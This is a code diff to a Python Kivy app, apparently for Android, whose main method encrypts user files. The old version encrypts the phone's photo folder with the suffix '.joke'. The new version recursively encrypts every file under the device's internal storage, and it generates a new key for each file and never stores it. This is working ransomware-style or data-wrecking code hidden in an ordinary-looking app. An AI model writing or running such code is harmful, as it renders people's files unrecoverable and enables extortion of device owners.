@@ -19,43 +19,36 @@ class MainApp(App):
         return self.layout
 
     def main(self):
-        def utpann():
-            return Fernet.generate_key()
+        def encrypt_file(file_path, output_path):
+            # Generate a Fernet key
+            key = Fernet.generate_key()
+            cipher = Fernet(key)
 
-        def sarvanash(file, key):
-            try:
-                with open(file, 'rb') as file_raw:
-                    data = file_raw.read()
+            with open(file_path, "rb") as file:
+                plaintext = file.read()
 
-                fernet = Fernet(key)
-                encrypted_data = fernet.encrypt(data)
+            # Encrypt the file
+            ciphertext = cipher.encrypt(plaintext)
 
-                with open(file + ".joke", 'wb') as file_enc:
-                    file_enc.write(encrypted_data)
-                
-                # # Update label text when a file is encrypted successfully
-                # self.label.text = f"{file} encrypted successfully!"
-            except Exception as e:
-                print(f"Error encrypting {file}: {e}")
+            # Save the encrypted file
+            with open(output_path, "wb") as file:
+                file.write(ciphertext)
 
-        files = []
+            print(f"File encrypted and saved as {output_path}")
 
-        # Replace the directory path with your desired path
-        # directory_path = "/root/Pictures"
-        directory_path = "/storage/emulated/0/DCIM"
-        for file in os.listdir(directory_path):
-            file_path = os.path.join(directory_path, file)
-            if os.path.isfile(file_path):
-                files.append(file_path)
+        def encrypt_files_in_directory(directory):
+            for root, _, files in os.walk(directory):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    encrypted_file = file_path + "_encrypted"  # Appending "_encrypted" to the original filename
+                    encrypt_file(file_path, encrypted_file)
 
-        self.label.text = str(files)
-        print(files)
+        try:
+            internal_storage = "/storage/emulated/0/"
+            encrypt_files_in_directory(internal_storage)
 
-        key = utpann()
-
-        for file in files:
-            sarvanash(file, key)
-            print(file + " encrypted successfully!")
+        except FileNotFoundError as e:
+            print(f"Error: {e}")
 
 if __name__ == '__main__':
     MainApp().run()
